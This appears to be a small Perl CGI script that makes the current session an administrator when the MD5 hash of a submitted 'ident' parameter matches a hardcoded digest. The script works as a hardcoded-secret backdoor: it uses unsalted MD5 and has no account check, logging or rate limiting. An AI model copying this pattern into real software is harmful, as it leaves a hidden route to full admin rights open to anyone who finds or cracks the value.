#!/usr/bin/perl

use DBI;
use Stuff;
use Digest::MD5 qw/md5_hex/;
use strict;
use warnings;

my $dbi = Stuff->get_dbi();
my $q = MyCGI->new($dbi);
my $sess_id = $q->get_session(1);

my $ident = $q->param('ident');

print $q->header('text/plain');

if (md5_hex($ident) eq 'a66c606e8b7f34ac2294a78f34f42a98') {
	$dbi->do("UPDATE sessions SET admin=1 WHERE id=?", {}, $sess_id);
	print "Done.\n";
} else {
	print "Fail.\n";
}
